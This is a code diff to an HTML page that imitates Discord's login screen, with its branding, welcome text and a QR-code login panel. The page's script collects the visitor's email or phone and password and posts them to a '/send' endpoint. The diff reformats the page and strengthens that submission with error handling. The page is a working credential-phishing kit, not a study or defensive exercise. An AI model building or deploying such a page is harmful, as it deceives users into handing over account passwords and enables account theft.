@@ -6,41 +6,17 @@
 <title>Discord Login</title>
 <style>
 * {margin:0; padding:0; box-sizing:border-box; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;}
-body {
-  height: 100vh;
-  background: linear-gradient(90deg, #1e1f25 0%, #5865f2 100%);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  overflow: hidden;
-}
-.card {
-  background-color: #313338;
-  color: #fff;
-  border-radius: 8px;
-  display: flex;
-  padding: 40px;
-  width: 800px;
-  max-width: 90%;
-  box-shadow: 0 0 25px rgba(0,0,0,0.3);
-  animation: fadeIn 0.8s ease;
-}
+body {height: 100vh; background: linear-gradient(90deg, #1e1f25 0%, #5865f2 100%); display: flex; justify-content: center; align-items: center; overflow: hidden;}
+.card {background-color: #313338; color: #fff; border-radius: 8px; display: flex; padding: 40px; width: 800px; max-width: 90%; box-shadow: 0 0 25px rgba(0,0,0,0.3); animation: fadeIn 0.8s ease;}
 @keyframes fadeIn { from {opacity: 0; transform: translateY(30px);} to {opacity: 1; transform: translateY(0);} }
 .left {flex: 1; margin-right: 40px;}
 .left h2 {font-size: 28px; margin-bottom: 10px;}
 .left p {color: #b9bbbe; font-size: 14px; margin-bottom: 25px;}
 label {display: block; font-size: 12px; font-weight: bold; color: #b9bbbe; margin-bottom: 8px;}
-input {
-  width: 100%; background-color: #1e1f22; border: none; color: #fff;
-  border-radius: 4px; padding: 10px; font-size: 14px; margin-bottom: 20px;
-}
+input {width: 100%; background-color: #1e1f22; border: none; color: #fff; border-radius: 4px; padding: 10px; font-size: 14px; margin-bottom: 20px;}
 input:focus {outline: 2px solid #5865f2;}
 .forgot {display: block; font-size: 13px; color: #00aff4; margin-bottom: 20px; text-decoration: none;}
-button {
-  width: 100%; background-color: #5865f2; color: #fff; border: none;
-  border-radius: 4px; padding: 10px; font-size: 16px; font-weight: bold;
-  cursor: pointer; transition: 0.2s;
-}
+button {width: 100%; background-color: #5865f2; color: #fff; border: none; border-radius: 4px; padding: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s;}
 button:hover {background-color: #4752c4;}
 .register {margin-top: 10px; font-size: 14px; color: #b9bbbe;}
 .register a {color: #00aff4; text-decoration: none;}
@@ -51,61 +27,64 @@ button:hover {background-color: #4752c4;}
 .right p {font-size: 13px; color: #b9bbbe; margin-bottom: 5px;}
 </style>
 </head>
-
 <body>
-  <div class="card">
-    <div class="left">
-      <h2>Welcome back!</h2>
-      <p>We're so excited to see you again!</p>
+<div class="card">
+  <div class="left">
+    <h2>Welcome back!</h2>
+    <p>We're so excited to see you again!</p>
 
-      <form id="loginForm">
-        <label>Email or Phone Number <span style="color:red">*</span></label>
-        <input type="text" name="user" placeholder="Enter your email or phone" required>
+    <form id="loginForm">
+      <label>Email or Phone Number <span style="color:red">*</span></label>
+      <input type="text" name="user" placeholder="Enter your email or phone" required>
 
-        <label>Password <span style="color:red">*</span></label>
-        <input type="password" name="pass" placeholder="Enter your password" required>
+      <label>Password <span style="color:red">*</span></label>
+      <input type="password" name="pass" placeholder="Enter your password" required>
 
-        <a href="#" class="forgot">Forgot your password?</a>
-        <button type="submit">Log In</button>
+      <a href="#" class="forgot">Forgot your password?</a>
+      <button type="submit">Log In</button>
 
-        <div class="register">
-          Need an account? <a href="#">Register</a>
-        </div>
-      </form>
-    </div>
-
-    <div class="right">
-      <div class="qr-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Discord_qr_code.png" alt="QR Code">
+      <div class="register">
+        Need an account? <a href="#">Register</a>
       </div>
-      <h3>Log in with QR Code</h3>
-      <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
-      <a href="#" style="color:#00aff4; font-size:13px;">Or, sign in with passkey</a>
-    </div>
+    </form>
   </div>
 
-  <script>
-    const form = document.getElementById("loginForm");
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const data = {
-        user: form.user.value,
-        pass: form.pass.value
-      };
+  <div class="right">
+    <div class="qr-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Discord_qr_code.png" alt="QR Code">
+    </div>
+    <h3>Log in with QR Code</h3>
+    <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+    <a href="#" style="color:#00aff4; font-size:13px;">Or, sign in with passkey</a>
+  </div>
+</div>
 
-      const res = await fetch("/send", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
+<script>
+const form = document.getElementById("loginForm");
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const data = { user: form.user.value, pass: form.pass.value };
 
-      if (res.ok) {
-        alert("✅ Sent successfully!");
-        form.reset();
-      } else {
-        alert("❌ Error sending data.");
-      }
+  try {
+    const res = await fetch("/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
     });
-  </script>
+
+    if (res.ok) {
+      alert("✅ Sent successfully!");
+      form.reset();
+    } else {
+      const text = await res.text();
+      console.error("Server error:", text);
+      alert("❌ Error sending data: " + res.status);
+    }
+  } catch (err) {
+    console.error("Network error:", err);
+    alert("❌ Network error, check console.");
+  }
+});
+</script>
 </body>
 </html>
